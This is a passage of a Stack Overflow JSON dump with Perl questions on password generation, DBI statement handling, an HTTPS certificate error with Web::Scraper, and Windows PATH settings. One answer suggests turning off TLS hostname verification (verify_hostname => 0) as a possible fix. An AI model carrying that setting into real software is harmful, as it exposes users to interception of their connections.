'0-9' &lt; /dev/urandom\n</code></pre>\n\n<p>part? </p>\n\n<p>Keeping it is important since it provides <em>Cryptographically Secure Pseudo-Random Numbers</em> (CSPRNs) for all Unix OSs. Of course, if Perl can get numbers from <code>/dev/urandom</code> then the <code>tr</code> can be replaced with Perl too, but the numbers from <code>urandom</code> need to stay. </p>\n\n<p>For convenience, I shared the base script with 65K words\n<a href=\"https://www.liveedu.tv/pastebin/KJ8T/raw\" rel=\"nofollow noreferrer\"><code>65kwords.txt</code></a>\nor\n<a href=\"https://paste.ee/r/q0vug\" rel=\"nofollow noreferrer\"><code>65kwords.txt</code></a></p>\n\n<p>Please use <strong>only core modules</strong>. It would be used for generating \"human memorable passwords\".</p>\n\n<p>Later, the (hashing) iteration count, where we would use this to store the passwords would be extremely high, so brute-force would be very slow, even with many many GPUs/FPGAs.</p>\n"}, {"tags": ["sql", "perl", "oracle11g"], "comments": [{"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 1, "creation_date": 1485411747, "post_id": 41867409, "comment_id": 70917933, "body": "Why don&#39;t you just parse the file, enqueue the statements, and then process the queue? No need to refer back to the file once it&#39;s been parsed."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1485427812, "post_id": 41867409, "comment_id": 70925361, "body": "Your approach is inherently flawed. Editing the file by hand makes <i>all</i> of the statements vulnerable to modification, including those that have already been executed. That means that your record may no longer match the contents of the file and your progress record is worthless. Also, <i>&quot;I tried to fetch the statements which are stored in the database, but I&#39;m not able to get the entire statement&quot;</i> means  that you have a bug that needs to be fixed. Is it simply that your database field isn&#39;t big enough?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1485445630, "post_id": 41867409, "comment_id": 70936685, "body": "@MattJacob: What do you mean here by <i>&quot;enqueue the statements&quot;</i>? DBI has no queuing mechanism as such."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1485451863, "post_id": 41867409, "comment_id": 70940791, "body": "@Borodin He&#39;s already inserting the statements into the database with a status of <code>success</code> after they run. I&#39;m suggesting separating the parsing and processing components and having the parser insert the statements into the table (the queue) with a <code>status</code> that indicates they need to be run. Every time it starts up, the processor looks for statements that need to be run and runs them."}, {"owner": {"reputation": 19, "user_id": 6076762, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/dbf70be52c927c14377b15432dd6273e?s=128&d=identicon&r=PG&f=1", "display_name": "Venkatesh k", "link": "https://stackoverflow.com/users/6076762/venkatesh-k"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1485501254, "post_id": 41867409, "comment_id": 70959375, "body": "@Borodin:I had given the long data type and I am able to see the entire statement was inserted into the data base.But  while fetching it back and storing it in perl variable,I was not getting the entire statement into the perl variable.Does new lines or tabs or spaces that are there in the sql statements will affect anything to not get back the entire statement?"}], "answers": [{"comments": [{"owner": {"reputation": 19, "user_id": 6076762, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/dbf70be52c927c14377b15432dd6273e?s=128&d=identicon&r=PG&f=1", "display_name": "Venkatesh k", "link": "https://stackoverflow.com/users/6076762/venkatesh-k"}, "edited": false, "score": 0, "creation_date": 1485499660, "post_id": 41871913, "comment_id": 70958767, "body": "Thanks Borodin .Your solution seems like the best one.I will try it."}, {"owner": {"reputation": 19, "user_id": 6076762, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/dbf70be52c927c14377b15432dd6273e?s=128&d=identicon&r=PG&f=1", "display_name": "Venkatesh k", "link": "https://stackoverflow.com/users/6076762/venkatesh-k"}, "edited": false, "score": 0, "creation_date": 1485501541, "post_id": 41871913, "comment_id": 70959511, "body": ":But this roll back will not going to roll back my DDL statements also RIGHT? It can only do for DML statements.Other than that your solution is perfect and best for my problem."}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 0, "last_activity_date": 1485445553, "last_edit_date": 1485445553, "creation_date": 1485428056, "answer_id": 41871913, "question_id": 41867409, "link": "https://stackoverflow.com/questions/41867409/comparing-sql-statements-from-the-file-with-the-sql-statements-stored-in-a-datab/41871913#41871913", "title": "Comparing SQL statements from the file with the SQL statements stored in a database", "body": "<p>I suggest something like this instead</p>\n\n<ul>\n<li><p>Read your file and split it on semicolons</p></li>\n<li><p><code>prepare</code> each statement in the file and push the statement onto an array</p></li>\n<li><p>If any statement fails to parse, then report it and abandon processing</p></li>\n<li><p>Start a transaction</p></li>\n<li><p><code>execute</code> each statement in turn from the array</p></li>\n<li><p>If any statement fails to execute then report it, roll back the transaction, and abandon processing</p></li>\n<li><p>Commit the transaction and terminate</p></li>\n</ul>\n"}], "owner": {"reputation": 19, "user_id": 6076762, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/dbf70be52c927c14377b15432dd6273e?s=128&d=identicon&r=PG&f=1", "display_name": "Venkatesh k", "link": "https://stackoverflow.com/users/6076762/venkatesh-k"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 48, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1485445553, "creation_date": 1485408415, "last_edit_date": 1485427586, "question_id": 41867409, "link": "https://stackoverflow.com/questions/41867409/comparing-sql-statements-from-the-file-with-the-sql-statements-stored-in-a-datab", "title": "Comparing SQL statements from the file with the SQL statements stored in a database", "body": "<p>I am parsing the statements from an SQL file (based on semicolon), executing them through <code>DBI</code>, and storing the statements which are executed successfully into Oracle database with \"success\" status.</p>\n\n<p>If an error comes in the middle of executing the SQL file because of bad syntax, I will stop my Perl script and correct the mistake. When I restart the Perl script, I need to compare the statements from the file with the statements that are in the database marked as successful.</p>\n\n<p>If a statement is already in the database I am not going to execute it again; I will just skip it. But if it is not there then I will start execution from that statement where it failed last time.</p>\n\n<p>What is the best way to compare them? I tried to fetch the statements which are stored in the database, but I'm not able to get the entire statement.</p>\n\n<p>How can I convert the big SQL statement into strings and store them in the database so that I can compare them using the <code>eq</code> operator?</p>\n"}, {"tags": ["perl", "https"], "comments": [{"owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 1, "creation_date": 1485409950, "post_id": 41866648, "comment_id": 70917456, "body": "This can mean that certificate validation is working properly but the URL you use is wrong, the server is not sending needed chain certificates, you are missing an important root certificate, the server is sending a self-signed certificate or similar. Or it could mean that SNI is in use and that you are using a very old version of the SSL libraries so that it gets not used and therefore the wrong certificate is sent by the server. Impossible to tell from these information but you might provide the URL in question and version of the modules you use etc if you want to get more help."}, {"owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 4, "creation_date": 1485410055, "post_id": 41866648, "comment_id": 70917483, "body": "The URI module does not matter at all here because it simply parses the URL. The relevant parts are Web::Scraper which depends on LWP which depends on IO::Socket::SSL which depends on Net::SSLeay which depends on OpenSSL for the SSL functionality. I&#39;ve edited the question to reflect this a bit but I cannot add the needed information like real URL and version of the libraries to actually look at the problem because only the OP can provide these."}, {"owner": {"reputation": 2287, "user_id": 1641112, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/00bee18fb974a0057fb61a56faf66052?s=128&d=identicon&r=PG", "display_name": "StevieD", "link": "https://stackoverflow.com/users/1641112/stevied"}, "reply_to_user": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 0, "creation_date": 1485986785, "post_id": 41866648, "comment_id": 71158556, "body": "Perl 5.20.2, Debian Jessie with libssl-dev installed, LWP::UserAgent 6.17, Web::Scraper 0.38,  IO::Socket::SSL 2.044, Net::SSLeay 1.80"}, {"owner": {"reputation": 2287, "user_id": 1641112, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/00bee18fb974a0057fb61a56faf66052?s=128&d=identicon&r=PG", "display_name": "StevieD", "link": "https://stackoverflow.com/users/1641112/stevied"}, "reply_to_user": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 0, "creation_date": 1485987346, "post_id": 41866648, "comment_id": 71158847, "body": "Actually, it looks like it works now after upgrading all the modules. But it takes about 2 min before anything is returned. Web pages over http happen much quicker."}, {"owner": {"reputation": 2287, "user_id": 1641112, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/00bee18fb974a0057fb61a56faf66052?s=128&d=identicon&r=PG", "display_name": "StevieD", "link": "https://stackoverflow.com/users/1641112/stevied"}, "reply_to_user": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 0, "creation_date": 1485991808, "post_id": 41866648, "comment_id": 71160575, "body": "And now I&#39;m finding that half the time it works and other half I get this:  GET <a href=\"https://olms.dol-esa.gov/query/getYearlyData.do:443\" rel=\"nofollow noreferrer\">olms.dol-esa.gov/query/getYearlyData.do:443</a> ==&gt; 500 Can&#39;t connect to olms.dol-esa.gov:443 (certificate verify failed) (128s) Can&#39;t connect to olms.dol-esa.gov:443 (certificate verify failed)  SSL connect attempt failed error:14090086:SSL routines:SSL3_GET_SERVER_CERTIFICATE:certificate verify failed at /usr/local/share/perl/5.20.2/LWP/Protocol/http.pm line 48, &lt;DATA&gt; line 1."}, {"owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 1, "creation_date": 1486014937, "post_id": 41866648, "comment_id": 71166983, "body": "Using LWP against this site works for me perfectly on a freshly installed debian jessie. Could not test with Web:Scraper because your code is incomplete. While knowing nothing about your environment my guess is that you are behind some SSL intercepting proxy which changes the certificate so that it is no longer trusted by the local CA and which also causes the delay. Using <code>openssl s_client -connect olms.dol-esa.gov:443</code> and looking at the certificate chain (shown on top of the output) might help to debug this problem."}, {"owner": {"reputation": 2287, "user_id": 1641112, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/00bee18fb974a0057fb61a56faf66052?s=128&d=identicon&r=PG", "display_name": "StevieD", "link": "https://stackoverflow.com/users/1641112/stevied"}, "reply_to_user": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 0, "creation_date": 1486034997, "post_id": 41866648, "comment_id": 71178359, "body": "Thanks for your continued help. I ran the command you suggested which output to the screen and then hung for two minutes after giving some errno message. I&#39;ve added the output along with more details to the OP."}, {"owner": {"reputation": 2287, "user_id": 1641112, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/00bee18fb974a0057fb61a56faf66052?s=128&d=identicon&r=PG", "display_name": "StevieD", "link": "https://stackoverflow.com/users/1641112/stevied"}, "reply_to_user": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 0, "creation_date": 1486035526, "post_id": 41866648, "comment_id": 71178714, "body": "I ran the same openssl command on another Debian box I have outside of the first box&#39;s network and got the same results."}, {"owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 1, "creation_date": 1486035827, "post_id": 41866648, "comment_id": 71178924, "body": "I don&#39;t know where the delay comes from but the certificate chain it returns suggest that at least no active man in the middle is there. It might still a firewall causing the delay (a packet capture would maybe help to debug this problem). As for the validation errors: I don&#39;t get the   <i>Verify return code: 19 (self signed certificate in certificate chain)</i> on jessie but instead <i>Verify return code: 0 (ok)</i>.  This suggests that something is different with the CA store on your system"}, {"owner": {"reputation": 2287, "user_id": 1641112, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/00bee18fb974a0057fb61a56faf66052?s=128&d=identicon&r=PG", "display_name": "StevieD", "link": "https://stackoverflow.com/users/1641112/stevied"}, "reply_to_user": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 0, "creation_date": 1486038078, "post_id": 41866648, "comment_id": 71180387, "body": "OK, I am getting closer. I took an older version of jessie I had laying around and ran my script and had the same problems. I ran apt-get upgrade and the problems went away. So I think it&#39;s just a matter of upgrading jessie on this virtual machine (though I&#39;m having problems with that). So there is something about this machine that is hosed.  Thanks for your help troubleshooting."}, {"owner": {"reputation": 2287, "user_id": 1641112, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/00bee18fb974a0057fb61a56faf66052?s=128&d=identicon&r=PG", "display_name": "StevieD", "link": "https://stackoverflow.com/users/1641112/stevied"}, "reply_to_user": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 0, "creation_date": 1486044048, "post_id": 41866648, "comment_id": 71184310, "body": "OK, got all packages updated and rebooted machine. Things are working quite nicely now. Thanks again for your help. Much appreciated."}], "answers": [{"tags": [], "owner": {"reputation": 121105, "user_id": 2766176, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/edd8638efe875601bfe394a8aea5b16d?s=128&d=identicon&r=PG", "display_name": "brian d foy", "link": "https://stackoverflow.com/users/2766176/brian-d-foy"}, "is_accepted": false, "score": 1, "last_activity_date": 1485444349, "last_edit_date": 1495539930, "creation_date": 1485444349, "answer_id": 41876907, "question_id": 41866648, "link": "https://stackoverflow.com/questions/41866648/certificate-verify-failure-with-webscraper-module/41876907#41876907", "title": "&quot;certificate verify failure&quot; with Web::Scraper module", "body": "<p><a href=\"http://www.metacpan.org/module/Web::Scraper\" rel=\"nofollow noreferrer\">Web::Scraper</a> uses <a href=\"http://www.metacpan.org/module/LWP::UserAgent\" rel=\"nofollow noreferrer\">LWP::UserAgent</a>. More modern versions of that attempt to verify the hostnames unless you turn off that feature. Something else may be going on, but this question is low in details.</p>\n\n<p>One of the constructor arguments to <a href=\"http://www.metacpan.org/module/LWP::UserAgent\" rel=\"nofollow noreferrer\">LWP::UserAgent</a> is:</p>\n\n<pre><code>LWP::UserAgent-&gt;new( \n    ssl_opts =&gt; { verify_hostname =&gt; 0 }\n    ...;\n    }\n</code></pre>\n\n<p>You can construct your own user agent object and give it to <a href=\"http://www.metacpan.org/module/Web::Scraper\" rel=\"nofollow noreferrer\">Web::Scraper</a>:</p>\n\n<pre><code>my $scraper = Web::Scraper-&gt;new(...);\n$scraper-&gt;user_agent( $your_own_lwp_useragent_object );\n</code></pre>\n\n<p>Also see the answer at \"<a href=\"https://stackoverflow.com/q/21534952/2766176\">Perl LWP::Simple HTTPS error</a>\". For more help, we'll need version details for the relevant modules and your openssl details.</p>\n"}], "owner": {"reputation": 2287, "user_id": 1641112, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/00bee18fb974a0057fb61a56faf66052?s=128&d=identicon&r=PG", "display_name": "StevieD", "link": "https://stackoverflow.com/users/1641112/stevied"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 235, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1486034967, "creation_date": 1485402917, "last_edit_date": 1486034967, "question_id": 41866648, "link": "https://stackoverflow.com/questions/41866648/certificate-verify-failure-with-webscraper-module", "title": "&quot;certificate verify failure&quot; with Web::Scraper module", "body": "<p>I have the following results in certificate validation problems:</p>\n\n<pre><code> use URI;\n use Web::Scraper\n my $res = $scraper-&gt;scrape( URI-&gt;new('https://example.com') );\n</code></pre>\n\n<p>After waiting about 2 min, I get the following error:</p>\n\n<blockquote>\n  <p>GET <a href=\"https://example.com\" rel=\"nofollow noreferrer\">https://example.com</a> failed: 500 Can't connect to example.com:443\n  (certificate verify failed)</p>\n</blockquote>\n\n<p>Per suggestion in comments, I ran <code>openssl s_client -connect olms.dol-esa.gov:443</code>. It output the following to the terminal instantly and then hung for about 2 minutes:</p>\n\n<pre><code>CONNECTED(00000003)\ndepth=3 O = Digital Signature Trust Co., CN = DST Root CA X3\nverify error:num=19:self signed certificate in certificate chain\nverify return:0\n---\nCertificate chain\n 0 s:/CN=olms.dol-esa.gov/O=DEPARTMENT OF LABOR/L=Washington/ST=District of Columbia/C=US\n   i:/C=US/O=IdenTrust/OU=TrustID Server/CN=TrustID Server CA A52\n 1 s:/C=US/O=IdenTrust/OU=TrustID Server/CN=TrustID Server CA A52\n   i:/C=US/O=IdenTrust/CN=IdenTrust Commercial Root CA 1\n 2 s:/C=US/O=IdenTrust/CN=IdenTrust Commercial Root CA 1\n   i:/O=Digital Signature Trust Co./CN=DST Root CA X3\n 3 s:/O=Digital Signature Trust Co./CN=DST Root CA X3\n   i:/O=Digital Signature Trust Co./CN=DST Root CA X3\n---\nServer certificate\n-----BEGIN CERTIFICATE-----\n&lt;SNIP&gt;\n-----END CERTIFICATE-----\nsubject=/CN=olms.dol-esa.gov/O=DEPARTMENT OF LABOR/L=Washington/ST=District of Columbia/C=US\nissuer=/C=US/O=IdenTrust/OU=TrustID Server/CN=TrustID Server CA A52\n---\nNo client certificate CA names sent\n---\nSSL handshake has read 6233 bytes and written 615 bytes\n---\nNew, TLSv1/SSLv3, Cipher is DES-CBC3-SHA\nServer public key is 2048 bit\nSecure Renegotiation IS supported\nCompression: NONE\nExpansion: NONE\nSSL-Session:\n    Protocol  : TLSv1.2\n    Cipher    : DES-CBC3-SHA\n    Session-ID: 3E5B2FBD819EF7880143C874181B7D67D3B1A0CE7C319B35F276E1CE8D9B9A18\n    Session-ID-ctx: \n    Master-Key: BE8A24B0350C48FCC3ECFA21AE896BF09F8978C481F3BE01E1E9B904A0BFB87098914DB6CD592BBC7634142A4B5C43FB\n    Key-Arg   : None\n    PSK identity: None\n    PSK identity hint: None\n    SRP username: None\n    Start Time: 1486034348\n    Timeout   : 300 (sec)\n    Verify return code: 19 (self signed certificate in certificate chain)\n---\n</code></pre>\n\n<p>After waiting about two minutes, the following was output:</p>\n\n<pre><code>read:errno=0\n</code></pre>\n"}, {"tags": ["perl", "path", "windows-7", "environment-variables", "strawberry-perl"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1485397243, "post_id": 41864672, "comment_id": 70913497, "body": "Can you provide the output of the <code>assoc .pl</code> and the output <code>ftype NAME</code> (replacing <code>NAME</code> with whatever&#39;s on the RHS of <code>.pl=</code> in the ouput of <code>assoc .pl</code>)."}, {"owner": {"reputation": 1744, "user_id": 1191147, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/cZDaT.jpg?s=128&g=1", "display_name": "Hashim Aziz", "link": "https://stackoverflow.com/users/1191147/hashim-aziz"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1485467177, "post_id": 41864672, "comment_id": 70949515, "body": "Never mind, @ikegami - you were right with your first comment yesterday. It turned out I needed to also add <code>.PL</code> to the PATHEXT environment variable. I&#39;d come across that solution yesterday, but didn&#39;t think it was relevant because I&#39;d never had to do it for the command-line programs I&#39;ve run in the past, but obviously I didn&#39;t think about the fact that they were contained in <code>.exe</code> files, so already existent in <code>PATHEXT</code>. Thanks for your help. If you want to put it in an answer, I&#39;ll accept it."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1485539660, "post_id": 41864672, "comment_id": 70982521, "body": "Re &quot;<i>It turned out I needed to also add .PL to the PATHEXT environment variable</i>&quot;, I deleted that comment since <code>.PL</code> does not appear in my <code>PATHEXT</code> and it works on my machine."}, {"owner": {"reputation": 1744, "user_id": 1191147, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/cZDaT.jpg?s=128&g=1", "display_name": "Hashim Aziz", "link": "https://stackoverflow.com/users/1191147/hashim-aziz"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1485540763, "post_id": 41864672, "comment_id": 70983141, "body": "Interesting. What paths do you have stored in PATH? Also, do you use Strawberry Perl or another Perl distribution?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1485540827, "post_id": 41864672, "comment_id": 70983180, "body": "The relevant path in <code>PATH</code> is <code>C:\\wyd</code>. /// ActivePerl, but this has nothing to do with who built my Perl; this is all the OS."}, {"owner": {"reputation": 1744, "user_id": 1191147, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/cZDaT.jpg?s=128&g=1", "display_name": "Hashim Aziz", "link": "https://stackoverflow.com/users/1191147/hashim-aziz"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1485552062, "post_id": 41864672, "comment_id": 70988743, "body": "Okay, I just tested again, and it appears that I was probably getting confused between the two things I was trying to do. To clarify: having the paths set in the <i>PATH</i> envrironment variable allows me to call the program from anywhere on my computer using <code>wyd.pl</code>, which was the main focus of this question. At the same time, I was also trying to make it so that I could call with just <code>wyd</code> i.e., without the extension, which is what including the extension <i>.PL</i> in the <i>EXT</i> environment variable does. To confirm - are you able to call the program with <code>wyd</code> alone, <i>without</i> changing <i>EXT</i>?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1485553115, "post_id": 41864672, "comment_id": 70989270, "body": "No, used <code>wyd.pl</code>. <code>PATHEXT</code> is what allows you to omit the extension."}, {"owner": {"reputation": 1744, "user_id": 1191147, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/cZDaT.jpg?s=128&g=1", "display_name": "Hashim Aziz", "link": "https://stackoverflow.com/users/1191147/hashim-aziz"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1485553255, "post_id": 41864672, "comment_id": 70989336, "body": "Pretty much confirms that, then. Just me being vacant-minded. I&#39;m kinda embarassed to even write an answer now, lol."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1485553412, "post_id": 41864672, "comment_id": 70989395, "body": "Your question would request a rewrite to be useful, so you could simply delete it instead."}, {"owner": {"reputation": 1744, "user_id": 1191147, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/cZDaT.jpg?s=128&g=1", "display_name": "Hashim Aziz", "link": "https://stackoverflow.com/users/1191147/hashim-aziz"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1485553525, "post_id": 41864672, "comment_id": 70989433, "body": "I&#39;m considering rewriting it. Do you think it&#39;s likely to be flagged as duplicate if I do?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1485554392, "post_id": 41864672, "comment_id": 70989884, "body": "Depends in which direction you change it. I don&#39;t know either way, though."}, {"owner": {"reputation": 1744, "user_id": 1191147, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/cZDaT.jpg?s=128&g=1", "display_name": "Hashim Aziz", "link": "https://stackoverflow.com/users/1191147/hashim-aziz"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1485555535, "post_id": 41864672, "comment_id": 70990385, "body": "I may as well go for it, unless you&#39;d rather write it instead? I appreciate that you&#39;ve spent a lot of time helping me, and if anyone should get the reputation for the simple answer that remains, it should be you. If you&#39;d rather not, I&#39;d be happy to."}], "owner": {"reputation": 1744, "user_id": 1191147, "user_type": "registered", "accept_rate": 80, "profile_image": 